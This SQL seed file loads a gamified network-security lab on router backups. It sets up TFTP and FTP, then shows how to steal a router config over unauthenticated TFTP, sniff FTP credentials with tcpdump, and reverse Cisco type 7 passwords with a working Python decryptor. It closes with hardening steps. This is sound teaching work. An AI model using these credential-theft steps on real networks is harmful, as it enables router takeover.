-- ═══════════════════════════════════════════════════════════════════
-- Lab (id=34) — TFTP/FTP & IOS Upgrades : full content (Vol 2 · Ch 8)
-- ═══════════════════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Back up a router the normal way — TFTP and FTP — then walk out with the full config, the enable password, and every secret it was hiding in plain sight.'
WHERE id = 34;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Back It Up the Normal Way',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Back It Up the Normal Way</h3>
<p>Every network eventually needs its configs and IOS images backed up somewhere off-box. The two classic tools are TFTP (trivial, UDP, built for exactly this) and FTP (older, but supports auth). Both predate the idea that a network might be hostile. TFTP has <strong>no authentication whatsoever</strong> — if you know a filename, you get the file. FTP has authentication, but sends the username and password as <strong>plain, unencrypted text</strong>. You're about to set up backups the way thousands of real networks still do it today.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 500 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: TFTP backup · FTP config transfer · type 7 vs type 5 passwords</span>
</div>

## Your arsenal (GNS3)

| Device | Role |
|---|---|
| R1 | The router being backed up |
| KALI | Doubles as your TFTP/FTP server AND your attacker later |

Wire `R1 → KALI` directly.

<ul class="objectives">
<li>Stand up a TFTP server and an FTP server on Kali</li>
<li>Back up R1's running-config to both</li>
<li>Set a weak, reversible enable password (the trap)</li>
</ul>

## Step 1 — Stand up the servers (Kali)

```
sudo apt install -y tftpd-hpa vsftpd
sudo mkdir -p /srv/tftp
sudo chown tftp:tftp /srv/tftp
sudo systemctl restart tftpd-hpa

sudo mkdir -p /srv/ftp
sudo useradd -d /srv/ftp -s /usr/sbin/nologin ftpadmin
echo "ftpadmin:cisco123" | sudo chpasswd
sudo systemctl restart vsftpd
```

## Step 2 — Set up R1 with a realistic (weak) configuration

This is the trap — `enable password` (not `secret`) with `service password-encryption` only produces a **type 7** password, which is trivially reversible, not actually cryptographic:

```
enable
configure terminal
enable password letmein123
service password-encryption
username admin password cisco123
snmp-server community NetBreak3rRO RO
end
```
<div class="callout warn">
<p><code>service password-encryption</code> feels like security, but type 7 is a simple, published, reversible cipher from the 1990s — it exists to keep passwords off a shoulder-surfer's screen, not to survive an actual attacker who gets the config file.</p>
</div>

## Step 3 — Back up to TFTP

```
copy running-config tftp://<KALI-IP>/R1-confg
```
Press Enter through the prompts (default filename is fine). Confirm it landed:
```
! on Kali
ls -la /srv/tftp/
```

## Step 4 — Back up to FTP

```
configure terminal
ip ftp username admin
ip ftp password cisco123
end
copy running-config ftp://<KALI-IP>/R1-ftp-backup.cfg
```

<div class="achievement">
<span class="medal">💾</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Backed Up — exactly like a real ops team does it every week</span></span>
</div>

**Next:** neither of those transfers had any real protection. Phase 2 shows exactly what that costs you.
$md$
WHERE lab_id = 34 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Walk Out With Everything',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>Walk Out With Everything</h3>
<p>You don't need to compromise R1 at all. The config already left the building over two protocols that hand it to anyone who asks nicely, or anyone simply listening on the wire.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> run every command here against your own GNS3 lab only.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 750 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: TFTP file exfiltration · FTP credential sniffing · Cisco type 7 decryption</span>
</div>

## Step 1 — Just... ask TFTP for the file

TFTP has no authentication and no directory listing — but backup filenames are extremely predictable (`<hostname>-confg` is Cisco's own default). If you can guess it, you own it:

```
tftp <KALI-IP>
tftp> get R1-confg
tftp> quit
cat R1-confg
```

<div class="callout tip">
<p><strong>💥 That's the moment.</strong> The entire running-config — interfaces, ACLs, the SNMP community string, and both password lines — is sitting in your current directory. You didn't touch R1. You asked a file server a question it was never built to refuse.</p>
</div>

## Step 2 — Sniff the FTP credentials in flight

FTP authentication is plaintext on the wire. Capture it live:

```
sudo tcpdump -i eth0 -A 'port 21' -c 20
```
Now trigger another backup from R1:
```
! on R1
copy running-config ftp://<KALI-IP>/R1-ftp-backup2.cfg
```
Back in the tcpdump output, look for lines containing `USER` and `PASS` — Kali just watched the username and password go by in cleartext, character for character.

## Step 3 — The enable password isn't actually protected

Open the stolen config and find the line that looks like:
```
enable password 7 094F471A1A0A
```
That `7` means type 7 — a fixed, published XOR-based cipher, not a hash. It has a known, well-documented algorithm and takes milliseconds to reverse:

```python
python3
```
```python
# Cisco type 7 uses a fixed 53-byte XOR key cycling from a given offset (seed).
XLAT = [0x64,0x73,0x66,0x64,0x3b,0x6b,0x66,0x6f,0x41,0x2c,0x2e,0x69,0x79,0x65,0x77,0x72,
        0x6b,0x6c,0x64,0x4a,0x4b,0x44,0x48,0x53,0x55,0x42,0x73,0x67,0x76,0x63,0x61,0x36,
        0x39,0x38,0x33,0x34,0x6e,0x63,0x78,0x76,0x39,0x38,0x37,0x33,0x32,0x35,0x34,0x6b,
        0x3b,0x66,0x67,0x38,0x37]

def decrypt7(enc):
    seed = int(enc[0:2])
    data = bytes.fromhex(enc[2:])
    return ''.join(chr(b ^ XLAT[(seed + i) % len(XLAT)]) for i, b in enumerate(data))

print(decrypt7("094F471A1A0A"))
```
That prints the real plaintext enable password — the "encryption" bought you nothing against anyone who has the config.

<div class="boss">
<span class="tag">☠ BOSS FIGHT — optional, +300 XP</span>
<h3>Full takeover with what you already have</h3>
<p>You now hold: the enable password (decrypted), the local username/password, and the SNMP RO community string — all from a config you got by <em>asking a file server nicely</em>. Use the decrypted enable password to log in and confirm full privileged access.</p>
</div>

```
telnet <R1-IP>
! username: admin, password: cisco123
enable
! password: <the decrypted type-7 password>
show running-config
```

<div class="achievement">
<span class="medal">🗝️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Master Key — every credential on the box, and you never touched an exploit</span></span>
</div>

**Next:** Phase 3 — kill TFTP entirely, encrypt FTP or drop it, and make sure a stolen config is worthless even if it happens again.
$md$
WHERE lab_id = 34 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Make the Backup Worthless to Steal',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Make the Backup Worthless to Steal</h3>
<p>Two separate failures happened here: the <strong>transport</strong> handed the file to anyone who asked, and the <strong>secrets inside the file</strong> were reversible even once someone had it. Fix both — a stolen backup should be a non-event, not a full compromise.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 800 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: SCP transfers · enable secret vs. password · AAA-authenticated copy</span>
</div>

<ul class="objectives">
<li>Disable the TFTP and unauthenticated FTP servers entirely</li>
<li>Switch to SCP for any future backups (encrypted, authenticated)</li>
<li>Replace the type 7 enable password with a real hashed <code>enable secret</code></li>
<li>Re-run the attack → TFTP refuses, FTP creds no longer float by, the enable password no longer decrypts to anything</li>
</ul>

## Fix 1 — Kill TFTP and unauthenticated FTP on the server side

```
sudo systemctl stop tftpd-hpa && sudo systemctl disable tftpd-hpa
sudo systemctl stop vsftpd && sudo systemctl disable vsftpd
```
If a TFTP server is genuinely required (some environments still need it for zero-touch provisioning), restrict it hard with a firewall rule to known device IPs only — never leave it open to the whole network.

## Fix 2 — Move to SCP: encrypted and authenticated

On R1, enable SCP server support tied to real AAA authentication:

```
configure terminal
aaa new-model
aaa authentication login default local
aaa authorization exec default local
username netadmin privilege 15 secret StrongPass!2026
ip scp server enable
end
```
Backups now travel over SSH — encrypted in transit, and requiring real credentials on both ends, not a filename guess.

## Fix 3 — Replace the type 7 password with a real hash

This is the fix that matters even if the transport is ever compromised again:

```
configure terminal
no enable password
enable secret MyMuchStr0ngerSecret!2026
end
```
`enable secret` stores an MD5 (or on modern IOS, scrypt/PBKDF2) hash — not a reversible cipher. Even with the full config file in hand, an attacker gets a hash they'd need to actually crack, not a `python3` one-liner.

<div class="callout tip">
<p>Also update the local user account the same way: <code>username netadmin privilege 15 secret ...</code> instead of <code>password ...</code>. Any line that says <code>password</code> instead of <code>secret</code> is a candidate for this same attack.</p>
</div>

## Re-run the attack (the fun part)

```
tftp <KALI-IP>
tftp> get R1-confg
```
<div class="callout tip">
<p>Connection refused — the service isn't listening anymore. And even in the disaster scenario where an old backup copy leaks from somewhere else entirely, opening it now shows <code>enable secret 9 $9$...</code> instead of a reversible type 7 string — nothing to decrypt in milliseconds this time.</p>
</div>

## Prove it to the grader

```
show running-config | include scp                ! SCP server enabled
show running-config | include enable secret       ! secret, not password
show run | include ip ftp|tftp                    ! no lingering plaintext credentials
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Nothing Left to Steal — the backup itself is now harmless if it leaks</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>TFTP/FTP &amp; IOS Upgrades — cleared</h3>
<p>You backed up a router the way most networks still do — then walked out with the full config, the FTP credentials off the wire, and a "protected" enable password that reversed in milliseconds. Then you killed the insecure transports, moved to authenticated SCP, and replaced every reversible password with a real hash.</p>
<p><strong>Total: 2050 XP</strong> · Next target: <code>Quality of Service</code>, where you'll learn what happens to voice traffic when nobody planned for contention.</p>
</div>
$md$
WHERE lab_id = 34 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  34,
  $svg$<svg viewBox="0 0 320 140" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <rect x="30" y="50" width="100" height="34" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="80" y="72" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">R1</text>
  <rect x="190" y="50" width="100" height="34" rx="7" fill="#fff" stroke="#c02a30" stroke-width="1.6"/>
  <text x="240" y="68" text-anchor="middle" font-size="10" fill="#c02a30" font-weight="600">KALI</text>
  <text x="240" y="79" text-anchor="middle" font-size="8" fill="#6b7480">TFTP + FTP server</text>
  <line x1="130" y1="67" x2="190" y2="67" stroke="#c02a30" stroke-width="2" stroke-dasharray="5 4"/>
  <text x="160" y="100" text-anchor="middle" font-size="8" fill="#6b7480">unauth'd transfer</text>
</svg>$svg$,
  $svg$<svg viewBox="0 0 600 220" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <rect x="60" y="80" width="170" height="56" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="145" y="103" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1</text>
  <text x="145" y="120" text-anchor="middle" font-size="9" fill="#6b7480">config + enable pw (type 7)</text>
  <rect x="370" y="80" width="180" height="56" rx="9" fill="#fff" stroke="#c02a30" stroke-width="1.8"/>
  <text x="460" y="103" text-anchor="middle" font-size="13" fill="#c02a30" font-weight="700">KALI</text>
  <text x="460" y="120" text-anchor="middle" font-size="9" fill="#6b7480">TFTP get + FTP sniff</text>
  <text x="460" y="132" text-anchor="middle" font-size="8" fill="#6b7480">+ type-7 decrypt</text>
  <line x1="230" y1="106" x2="370" y2="106" stroke="#c02a30" stroke-width="2.5" stroke-dasharray="6 5"/>
  <text x="300" y="96" text-anchor="middle" font-size="9" fill="#6b7480">TFTP 69 / FTP 21 → SCP 22</text>
</svg>$svg$,
  $json$["Router (backup source)", "TFTP/FTP server (attacker-controlled)", "Unauthenticated transfer"]$json$::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
